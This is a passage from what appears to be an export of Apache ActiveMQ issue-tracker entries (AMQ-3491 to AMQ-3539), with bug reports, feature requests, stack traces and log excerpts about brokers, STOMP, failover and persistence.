org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)null    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)null    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)null    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)null          at java.lang.Thread.run(Thread.java:619)null=======================================================================================2011-09-07 12:43:41,028 ERROR &#91;cursors.FilePendingMessageCursor&#93; &#91;1315421994681&#93; : &#91;ActiveMQ Transport: tcp:///134.242.171.26:35469&#93; Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 82, responseRequired = false, messageId = ID:lgvn-33053-1315415867932-0:19:1:1:78, originalDestination = null, originalTransactionId = null, producerId = ID:lgvn-33053-1315415867932-0:19:1:1, destination = queue://snTableQueue_CHF, transactionId = null, expiration = 0, timestamp = 1315424620840, arrival = 0, brokerInTime = 1315424620881, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@d42d49, marshalledProperties = org.apache.activemq.util.ByteSequence@1e91c40, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {TO=0, FROM=37, HOST=134.242.171.26, trigger_name=com.foo.receiver.beans.ACTData, version=3.4}, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursorjava.lang.RuntimeException: java.lang.NullPointerExceptionnull    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:460)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:226)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:196)null    at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1603)null      at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:715)null    at org.apache.activemq.broker.region.Queue.send(Queue.java:647)null    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:409)null    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:543)null    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:301)null    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null      at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)null    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)null    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null        at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)null    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null    at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)null          at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)null    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)null    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)null    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)null    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)null      at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)null    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)null          at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)null        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)null    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)null      at java.lang.Thread.run(Thread.java:619)nullCaused by: java.lang.NullPointerExceptionnull        at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:229)null      at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)null      at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:225)null    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null          ... 26 morenull
issueID:AMQ-3491
type:Task
changed files:
texts:Investigate and resolve LGPL dependency via camel-web
May be related to trimmed down distro that uses old camel web.see: https://issues.apache.org/jira/browse/AMQ-3329ActiveMQ 5.5.0"s distro includes Jaffl 0.5.1 which isLGPL. I traced this down to the distro containing an unpackedcamel-web 2.4.0 war, which has several org.jruby:jruby dependencies init. My read is that this is a problem because of:http://www.apache.org/legal/resolved#category-xI also noted that the distro includes org.jruby.ext.posix:jnr-posixwhich may be LGPL/GPL and also org.jruby.extras:jffi:1.0.1 whichappears to be LGPL as well.The following artifacts have gaffl in them:------------------------------------------------ groupid              artifactid            version ------------------------------------------------ org.apache.activemq  apache-activemq       5.4.2    org.apache.activemq  apache-activemq       5.4.0    org.apache.activemq  apache-activemq       5.4.1    org.apache.activemq  apache-activemq       5.5.0    org.apache.camel     camel-web-standalone  2.4.0    org.apache.camel     camel-web             2.4.0   ------------------------------------------------
issueID:AMQ-3492
type:New Feature
changed files:JmsProducerClient.java
JmsProducerProperties.java
texts:enhance maven-activemq-perf-plugin to send specific message loaded from a file
For load testing a particular application (with JMS Consumer) it will often be required to send a fixed message to the broker. Otherwise consumers might reject the message.Currently the maven-activemq-perf-plugin does not support sending messages with a particular content. I propose to improve this plugin so that the producer can be configured to load a message from a file that is then used for the load test.
issueID:AMQ-3493
type:Bug
changed files:
texts:Incorrect JMX properties after consuming msgs using stomp (with TX and client ack)
When the receive is done transactional using client ack mode, the JMX properties of the broker are incorrect after the test:EnqueueCount and DispatchCount are correctDequeue count is DispatchCount +1 (but should be DispatchCount)InflightCount and QueueSize are -1 (but should be 0)Messages get received correctly be the stomp consumer though.Disabling either client ack mode or transactions in the stomp consumer does not show the problem.
issueID:AMQ-3494
type:Task
changed files:
texts:Upgrade to Camel 2.8.1
Apache Camel 2.8.1 has been released, and we should upgrade to use it.
issueID:AMQ-3496
type:Improvement
changed files:
texts:Provide configurable default for unqualified stomp reply-to header destination string
Sending a STOMP message with a test string ("some destination") as the "reply-to" header and ActiveMQ rejected it:Illegal destination name: &#91;some destination&#93; &#8211; ActiveMQ STOMP destinations must begin with one of: /queue/ /topic/ /temp-queue/ /temp-topic/The JMS specification contains:The JMSReplyTo header field contains a Destination supplied by a client whena message is sent. It is the destination where a reply to the message should besent. &#91;...&#93;Messages sent with a JMSReplyTo value are typically expecting a response. Aresponse may be optional, it is up to the client to decide.Because stomp is layered over jms, we need to default the destination type of any arbitrary string such that the intent is encoded in the destination name.Making use of the org.apache.activemq.command.UnresolvedDestinationTransformer from https://issues.apache.org/jira/browse/AMQ-3401 makes sense in this case.
issueID:AMQ-3497
type:Bug
changed files:
texts:STOMP subscription receipt can be out of order with message dispatch, resulting in consumer/client error
When a receipt&#91;1&#93; is specified on a subscribe frame, it is possible that a message dispatch on the newly created subscription gets delivered  before the RECEIPT, causing a stomp client to error out. The perl client  http://search.cpan.org/~lcons/Net-STOMP-Client-1.1/ gives*** unexpected RECEIPT frame received: xxx &#91;1&#93; http://stomp.github.com/stomp-specification-1.1.html#Header_receipt
issueID:AMQ-3498
type:New Feature
changed files:
texts:Add support for setting ActiveMQ destination options in Camel endpoint uris
It should be possible to configure and use ActiveMQ Destination Optionshttp://activemq.apache.org/destination-options.htmlOn Camel endpoints, so you can do something like    <route>      <from uri="file://src/test/data?noop=true"/>      <!-- use consumer.exclusive ActiveMQ destination option, notice we have to prefix with destination. -->      <to uri="activemq:queue:foo?destination.consumer.exclusive=true"/>    </route>Notice we need to prefix the options with destination. to avoid clashes with the consumer. which is the regular Camel Consumer prefix.Since this is an ActiveMQ specific feature, we should add it to the activemq-camel component, and not directly in camel-jms.
issueID:AMQ-3499
type:Improvement
changed files:TransportConnection.java
texts:Raise Logging level to warn for Transport failure exceptions
Transport failure is usually an indication that there is a problem in the jms connection oriented sphere, less so in stomp.Stuff like2011-07-13 11:46:00,340 [2.179.220:52512] INFO Transport - Transport failed: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path validation failed: java.security.cert.CertPathValidatorException: timestamp check failed should be a warn.For stomp, connection reset and EOf exceptions should be suppressed as they are normal in the absence of DISCONNECT frame.With debug level logging, all failures and stack traces are visible.
issueID:AMQ-3500
type:Improvement
changed files:ActiveMQMessageConsumer.java
texts:Setting destination options should validate against typos
I think the logic does not validate that all the destination option was succesfully configured.http://activemq.apache.org/destination-options.htmlSo if you make a typo, AMQ may continue as normal.We should add logic like in Camel, where we check the Map is zero after the introspection logic have set the options.
issueID:AMQ-3501
type:Bug
changed files:
texts:Stomp v1.1 support, headers, eg: message-id, are not properly escaped
headers need to be escaped, see: http://stomp.github.com/stomp-specification-1.1.html#Value_Encodingbut the message-id header on a message receipt is not, the perl stomp v 1.1 client does a check:# STOMP 1.1 behavior:            #  - header names and values can contain any OCTET except 
 or :            #  - space is significant in the header            #  - "only the first header entry should be used"            #  - handle backslash escaping            foreach $line (split(/
/, $temp)) {                unless ($line =~ /^([^:]+):([^:]*)$/o) {                    Net::STOMP::Client::Error::report("%s: invalid header: %s", $me, $line);                    return(); and errors out on the un-escaped ":"in the raw message-id. This was not a requirement in STOMP v1.0.  *** Net::STOMP::Client::Frame::decode(): invalid header: message-id:ID:gtmbp.local-52988-1316088964662-2:7:-1:1:1 at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client/Error.pm line 39 Net::STOMP::Client::Error::report("%s: invalid header: %s", "Net::STOMP::Client::Frame::decode()", "message-id:ID:gtmbp.local-52988-1316088964662-2:7:-1:1:1") called at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client/Frame.pm line 286 Net::STOMP::Client::Frame::decode("SCALAR(0x987818)", "version", 1.1, "state", "HASH(0x988184)") called at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client.pm line 472 Net::STOMP::Client::receive_frame("Net::STOMP::Client=HASH(0x988040)", 1) called at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client.pm line 502
issueID:AMQ-3504
type:Bug
changed files:WSTransportServer.java
texts:NullPointerException on websocket connection
When connecting from chrome or firefox 6 over websockets, I get the Null pointer below. It does not happen on firefox 5 or safari . My guess would be that the chrome and ff 6 are implementing a newer version of the websocket spec that is incompatible with the version that the activemq implements.     2011-09-19 09:18:33,931 | WARN  | /stomp | org.eclipse.jetty.util.log | qtp1545215993-39java.lang.NullPointerException        at org.apache.activemq.transport.ws.StompServlet.doGet(StompServlet.java:51)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)        at org.eclipse.jetty.websocket.WebSocketServlet.service(WebSocketServlet.java:73)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:423)        at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)        at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)        at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)        at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)        at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)        at org.eclipse.jetty.server.Server.handle(Server.java:351)        at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)        at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)        at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)        at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)        at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)        at org.eclipse.jetty.server.bio.SocketConnector$ConnectorEndPoint.run(SocketConnector.java:241)        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)        at java.lang.Thread.run(Thread.java:680)
issueID:AMQ-3506
type:Bug
changed files:
texts:Access to ConnectionPool.createSession needs to be synchronized
When configuring a PooledConnectionFactory with maximumActive=1 and blockIfSessionPoolIsFull=true (default behavior for latter config) it is possible that multiple threads that concurrently try to use the same JMS connection to create a new session might create more sessions than the configured maximumActive limit.That"s because the call to ConnectionPool.createSession() is not synchronized and if multiple threads try to call this method concurrently (on the same underlying JMS connection) then the if-condition in SessionKey key = new SessionKey(transacted, ackMode);SessionPool pool = cache.get(key);if (pool == null) {  pool = createSessionPool(key);  cache.put(key, pool);}will evaluate to true for all threads and they all end up creating their own sessionPool using the same SessionKey properties. Access to the if-condition needs to be synchronized so that only one session pool gets created. That will ensure that not more than the configured maximumActive number of sessions can get created.
issueID:AMQ-3507
type:Bug
changed files:
texts:Large number of expiring messages causing QueueSize to grow.
Issue with file pending message cursor (non persistent messages) discarding expired messages. It currently bypasses the destination expiry logic and leaves messages in the store.In the main, an expired messages don"t get added to the cursor or are pruned by the async expiry processing task, but when memory limits are exceeded this problem can occur.
issueID:AMQ-3509
type:Improvement
changed files:SimpleAuthenticationBroker.java
JaasCertificateAuthenticationBroker.java
JaasAuthenticationBroker.java
texts:Add the user name in the "User name or password is invalid" error line
When a transport connector cannot connect due invalid username, then we see a WARN log in the log fileWARN  Transport                      - Transport failed: java.io.IOException: User name or password is invalid.It would be good if the username could be logged as well. People who maintain the AMQ brokers may have trouble figuring out what username was used and be able to track down the problem. Such as if the password is expired, if the username is actually okay etc.So I propose to include the username in the log line.
issueID:AMQ-3511
type:Improvement
changed files:StompTransportFilter.java
texts:enhance STOMP message logging so that only STOMP Frames may be redirected to another file.
Most logging in the stomp transport layer occurs in the "org.apache.activemq.transport.stomp" namespace but if you only want to direct frame tracing to a separate file via the method described here: http://activemq.apache.org/stomp.html#Stomp-Debugging you cannot.  We should direct the frame level logging to a separate namespace so that only frames can be logging in a different file if desired.  We can output the frame to "org.apache.activemq.transport.stomp.StompIO" easily in the StompTransportFilter class.
issueID:AMQ-3512
type:Improvement
changed files:
texts:Using browse command fails when a message with an array of bytes is encountered.
-bash-3.2$ /home/y/bin/activemq_server_admin browse   --amqurltcp://localhost:61616 VirtualTopicConsumers.ac4-stg-2.Soo_RMXReplicator_PrimaryERROR: java.lang.RuntimeException: Failed to execute browse task. Reason: java.lang.reflect.InvocationTargetExceptionjava.lang.RuntimeException: Failed to execute browse task. Reason: java.lang.reflect.InvocationTargetException     at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:144)     at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)     at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)     at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)     at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)     at java.lang.reflect.Method.invoke(Method.java:597)     at org.apache.activemq.console.Main.runTaskClass(Main.java:251)     at org.apache.activemq.console.Main.main(Main.java:107)     at yjava.activemq.server.admin.ActiveMQAdmin.main(ActiveMQAdmin.java:39)ERROR: java.lang.Exception: java.lang.reflect.InvocationTargetExceptionjava.lang.Exception: java.lang.reflect.InvocationTargetException     at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:145)     at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)     at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)     at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)     at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)     at java.lang.reflect.Method.invoke(Method.java:597)     at org.apache.activemq.console.Main.runTaskClass(Main.java:251)     at org.apache.activemq.console.Main.main(Main.java:107)     at yjava.activemq.server.admin.ActiveMQAdmin.main(ActiveMQAdmin.java:39)Caused by: java.lang.reflect.InvocationTargetException     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)     at java.lang.reflect.Method.invoke(Method.java:597)     at org.apache.activemq.console.filter.MapTransformFilter.transformElement(MapTransformFilter.java:67)     at org.apache.activemq.console.filter.ResultTransformFilter.transformList(ResultTransformFilter.java:67)     at org.apache.activemq.console.filter.ResultTransformFilter.query(ResultTransformFilter.java:43)     at org.apache.activemq.console.filter.PropertiesViewFilter.query(PropertiesViewFilter.java:58)     at org.apache.activemq.console.filter.PropertiesViewFilter.query(PropertiesViewFilter.java:58)     at org.apache.activemq.console.util.AmqMessagesUtil.filterMessagesView(AmqMessagesUtil.java:64)     at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:140)     ... 11 moreCaused by: java.lang.ClassCastException: [B cannot be cast to [Ljava.lang.Object;     at org.apache.activemq.console.filter.MapTransformFilter.getDisplayString(MapTransformFilter.java:336)     at org.apache.activemq.console.filter.MapTransformFilter.transformToMap(MapTransformFilter.java:213)     ... 22 more-bash-3.2I"ll attach a patch and a test case for getDisplayString shortly.
issueID:AMQ-3513
type:Bug
changed files:
texts:initialReconnectDelay is ignored for Failover transport
initalReconnectDelay is ignored during failover.  If multiple brokers are running, the failover transport attempts to failover immediately and does not honor the initialReconnect delay.  Patch is attached.
issueID:AMQ-3514
type:Bug
changed files:MessageListenerServlet.java
texts:MessageListenerServlet does not clear the timer on destroy
Hi, we are debugging a shutdown problem using the activemq-web-console deployed into jetty. It seems as if everything is terminated as expected, apart from a TimerThread which logs to the console about every minute. 05 Jul 2011 09:03:19,246 DEBUG &#91;Timer-1&#93; org.apache.activemq.web.MessageListenerServlet.debug() &#8211; Cleaning up expired web clients. Tracing down the problem indicated one possible cause. The web-console package declares the AjaxServlet to send messages via the web to the broker, it extends MessageListenerServlet. The init() mehtod of the MessageListenerServlet schedules task         clientCleanupTimer.schedule( new ClientCleaner(), 5000, 60000 ); but the timer (clientCleanupTimer) is never canceled and according to the javadoc of Timer this can prevent the JVM from shutting down cleanly. Patch attached
issueID:AMQ-3515
type:Bug
changed files:MultiKahaDBPersistenceAdapter.java
texts:MultiKahaDBPersistenceAdapter can not set directory
There is an assignment to self in the directory setter of MultiKahaDBPersitenceAdapter.  this.directory=directory should be this.directory=dir.
issueID:AMQ-3516
type:Bug
changed files:
texts:Failover Transport MessageAck commands aren&#39;t filtered in oneway
There"s some code in FailoverTransport.oneway that was intended to MessageAck commands when the transport was in a failed state that will never be called.                if (isShutdownCommand(command) && connectedTransport.get() == null) {                    if (command.isShutdownInfo()) {                        // Skipping send of ShutdownInfo command when not                        // connected.                        return;                    }                    if (command instanceof RemoveInfo || command.isMessageAck()) {                        // Simulate response to RemoveInfo command or ack (as it                        // will be stale)                        stateTracker.track(command);                        Response response = new Response();                        response.setCorrelationId(command.getCommandId());                        myTransportListener.onCommand(response);                        return;                    }                }The inner if statement that looks for MessageAck will never be reachable since a MessageAck is not a RemoveInfo or ShutdownInfo command which is the condition for getting into the outer if.
issueID:AMQ-3517
type:Bug
changed files:
texts:Failover Transport will never call transportResumed when it reconnects to a hot backup transport.
The Failover transport will always call transportInterrupted but if there"s a hot backup in the backups list it won"t call the transportResumed method on its listener, it just reconnects and returns.
issueID:AMQ-3518
type:Bug
changed files:MessageServletSupport.java
texts:MessageServletSupport request body does not check the content-type in an intelligent way
The MessageServlet used for the REST interface supplied in the demo web app will not correctly use the request body of an HTTP POST request if the content-type header contains more than just the MIME type.The specification for this header indicates that there can be multiple values in this header.
issueID:AMQ-3519
type:New Feature
changed files:
texts:Allow getJMSRedelivered flag to survive a restart
Jmsredelivery status is maintained by the activemq consumer and in memory by the broker when a consumer closes. If the broker is restarted, the redelivery status is lost.The broker never rewrites a message so the modified property is lost.To make the redelivery flag reliable, it needs to be persisted.
issueID:AMQ-3520
type:Improvement
changed files:
texts:activemq-rar should include the slf4j log4j bridge
The produced rar distribution file contains all of the required logging jar files except for the slf4j-log4j bridge.We should include this file as part of the rar distribution so that users can use this feature out of the box.
issueID:AMQ-3521
type:Improvement
changed files:HttpClientTransport.java
pom.xml
HTTPDiscoveryAgent.java
texts:Update the http transport implementation from using HttpCommon v3.1 to HttpCore/HttpClient v4.x
The current implementation of the http transport is using the no longer maintained v3.1 of the http commons implementation.This should be replaced with the latest release of the http core/http client v4.x.
issueID:AMQ-3523
type:Bug
changed files:
texts:NetworkConnector MBean unregistration can fail with a transport disconnect - leaving dangling mbean
MBeans for NetworkConnectors embed the target address, but on unregistraton due to shutdown from a transport failure, the remote address can be null, resulting in a failure to find the MBean. The  mbean name should be remembered from registration rather than generated on the fly.
issueID:AMQ-3524
type:Bug
changed files:TraceBrokerPathPlugin.java
texts:NullPointerException in TraceBrokerPath plugin.
Exception in thread "BrokerService&#91;GTIC01M01&#93; Task-3" java.lang.NullPointerExceptionat org.apache.activemq.broker.util.TraceBrokerPathPlugin.preProcessDispatch(TraceBrokerPathPlugin.java:53)at org.apache.activemq.broker.MutableBrokerFilter.preProcessDispatch(MutableBrokerFilter.java:203)at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:826)at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:864)at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:896)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)at java.lang.Thread.run(Thread.java:735)
issueID:AMQ-3526
type:Bug
changed files:
texts:JDBC persistence adapter, destination mbeans not visible on restart till producers or consumers  reattach
With the jdbc store, if there are pending messages on a restart, the destinations do not appear in jmx till they are reused. So inactive destinations are not recreated on restart.Any use of the destination will get the mbean to be created, new producer/consumer etc.
issueID:AMQ-3527
type:Bug
changed files:
texts:./activemq script cannot be started on Solaris OS 10
issue with finding whoami and use of bash $(..) evaluations in place of `` bourne shell syntax
issueID:AMQ-3532
type:Bug
changed files:
texts:expiry of offline durable subscription on activation can lead do duplicate expiry processing and negative pending cursor size
The durable subscription cursor pending message count can go negative and prevent dispatch of later unexpired messages. Also, contention between dispatch and the expiry task can lead to blocked dispatch.
issueID:AMQ-3533
type:Improvement
changed files:
texts:mKahaDB, allow the directory of a filtered destination to be specified, such that destination journals can be split across disks
the directory attribute of mKahaDB overrides the attribute in a filtered persistence adapter, it should only be a backup or default value, if not is explicitly specified.
issueID:AMQ-3534
type:Improvement
changed files:
texts:Fixes to poms to allow eclipse indigo and m2eclipse to not show errors.
m2eclipse as it ships with eclipse indigo will complain about targets/phases it does not understand.The method for solving this is to use a pluginManagement & plugin section in your pom to specify targets it should ignore.IMHO, I dislike this solution, but it allows me to edit code in eclipse and use command line maven to execute the generation targets.Patch will be attached shortly.
issueID:AMQ-3536
type:Bug
changed files:
texts:Virtual Topic Subscriber and Individual Dead Letter Queue Handling
Summary: Transactional Acknowledgement with Virtual Topic / Subscriber Queues does not indicate which subscriber had a problem consuming the messages. Messages are simply delivered to Topic specific DLQ rather than to the Subscriber/Consumer specific DLQ.Steps to create issue:Configure the Individual Dead Letter Queue policy in Fuse Message Broker. Next create an ActiveMQ Virtual Topic with Subscriber Queue(s).Send messages to Virtual TopicRollback/abort ack for one message (consistently) until this message gets delivered to the dead letter queue.Result:Message is sent to the Topic Specific Dead Letter Queue rather than to the DLQ specific to the Subscriber Queue.Resolution:Patch and unit test are are attached.This test verifies that all undelivered messages sent to a consumers listening on a queue associated with a virtual topic with be forwarded to separate DLQ"s.Note that the broker config, Individual Dead Letter Strategy, needs to have the enable audit set to false to allows duplicate messages sent from a topic to individual consumers to be forwarded to the DLQ"s.<deadLetterStrategy> <bean xmlns="http://www.springframework.org/schema/beans" class="org.apache.activemq.broker.region.policy.IndividualDeadLetterStrategy">         <property name="useQueueForQueueMessages" value="true"></property>                <property name="processNonPersistent" value="true"></property>                <property name="processExpired" value="false"></property>                <property name="enableAudit" value="false"></property>        </bean></deadLetterStrategy>
issueID:AMQ-3537
type:Bug
changed files:
texts:ClassLoadingAwareObjectInputStream cannot handle deserializing proxies with mixed JDK & non-JDK interfaces
When the ActiveMQ client attempts to unpack an ObjectMessage that contains a proxy with a mix of JDK and non-JDK interfaces the ClassLoadingAwareObjectInputStream chooses ONLY the ClassLoader from  the first interface in the array of interfaces represented by the proxy.  This means that if a proxy"s first interface is a JDK class (java.util.List, java.sql.Blob) the core ClassLoader is used.  In the event that a non-JDK interface is present in the list of proxied interfaces the same core ClassLoader is used.  The Proxy.getProxyClass subsequently throws an IllegalArgumentException because the non-JDK interface class cannot be loaded by the core ClassLoader.This problem is extant during deserialization of an ObjectMessage payload that contains a proxy that implements &#91;java.sql.Blob, org.hibernate.engine.jdbc.WrappedBlob, java.io.Serializable&#93; (a blob proxy created by hibernate SerializableBlobProxy).   The impact of this bug is that users of Hibernate cannot use ActiveMQ as a messaging framework if they need to package ValueObjects that have mapped lobs.
issueID:AMQ-3539
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:Prefetch state can be incorrect when transacted redelivery of duplicates occurs, causing stalled queue
In ActiveMQMessageConsumer, delivery acks are generated by receive() calls and by the dispatch() method when transacted redelivery of duplicates occurs.  These delivery acks are consolidated by calling ackLater which batches them up using first/last message id and sends the acks as appropriate w.r.t. the prefetch size. On the broker, the prefetch window is extended by checking the last message id, finding where it is in the dispatched queue and incrementing the prefetchExtension accordingly.  This algorithm depends on the consumer maintaining the dispatch order in its consolidated delivery acks. When the transacted redelivery occurs, it happens in a separate thread than the receive, operating on the latest delivered message.  The delivery acks from the receive thread are arbitrarily delayed (but in order of dispatch) depending on client action.  The mixing of these can result in an out of order consolidated delivery ack.Real example (the client and broker logs are mixed to make it easier to follow; the dispatch logs come from my own custom logging plugin):2011-10-12 11:51:51,712 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-3] - Dispatching message [ID:XXX-45585-1318434687322-0:68:1:1:1]2011-10-12 11:51:51,834 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-43] - Dispatching message [ID:XXX-60241-1318434687532-0:56:1:1:3]2011-10-12 11:51:51,835 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-43] - Dispatching message [ID:XXX-45585-1318434687322-0:68:1:1:2]2011-10-12 11:51:51,836 DA [ActiveMQ Session Task-1] - ID:XXX-60241-1318434687532-0:33:1:1 tracking transacted redelivery of duplicate: ActiveMQTextMessage {commandId = 827, responseRequired = true, messageId = ID:XXX-45585-1318434687322-0:68:1:1:2, originalDestination = null, originalTransactionId = null, producerId = ID:XXX-45585-1318434687322-0:68:1:1, destination = queue://indexer.index-content-dispatcher, transactionId = null, expiration = 0, timestamp = 1318434696398, arrival = 0, brokerInTime = 1318434696461, brokerOutTime = 1318434711835, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@305e3ad0, dataStructure = null, redeliveryCounter = 0, size = 0, properties = XXX }2011-10-12 11:51:51,876 TRACE ActiveMqBroker [ActiveMQ Transport: tcp:///127.0.0.1:55235] - firstId: ID:XXX-45585-1318434687322-0:68:1:1:2, lastId: ID:XXX-45585-1318434687322-0:68:1:1:1, dest: queue://indexer.index-content-dispatcher, acktype:0, individualAck:false, deliveredAck:true, messageAck:true, standardAck:false2011-10-12 11:51:51,878 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-8] - Dispatching message [ID:XXX-60241-1318434687532-0:56:1:1:4]2011-10-12 11:51:51,879 DA [ActiveMQ Session Task-1] - ID:XXX-60241-1318434687532-0:33:1:1 tracking transacted redelivery of duplicate: ActiveMQTextMessage {commandId = 840, responseRequired = true, messageId = ID:XXX-60241-1318434687532-0:56:1:1:4, originalDestination = null, originalTransactionId = null, producerId = ID:XXX-60241-1318434687532-0:56:1:1, destination = queue://indexer.index-content-dispatcher, transactionId = null, expiration = 0, timestamp = 1318434696518, arrival = 0, brokerInTime = 1318434696600, brokerOutTime = 1318434711878, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@332a4674, dataStructure = null, redeliveryCounter = 0, size = 0, properties = XXX }2011-10-12 11:51:51,903 TRACE ActiveMqBroker [ActiveMQ Transport: tcp:///127.0.0.1:55235] - firstId: ID:XXX-60241-1318434687532-0:56:1:1:4, lastId: ID:XXX-60241-1318434687532-0:56:1:1:3, dest: queue://indexer.index-content-dispatcher, acktype:0, individualAck:false, deliveredAck:true, messageAck:true, standardAck:false2011-10-12 11:51:51,905 TRACE ActiveMqBroker [BrokerService[jmsBroker] Task-8] - Dispatching message [ID:XXX-45585-1318434687322-0:68:1:1:3]In the first ack received by the broker, you can see that message 68:1:1:2 is the first id and 68:1:1:1 is the last id.  The broker never looks at the first id and will consider this a delivery ack of everything up to 68:1:1:1 (which was the first message dispatched).  Thus this mixing results in a incorrect 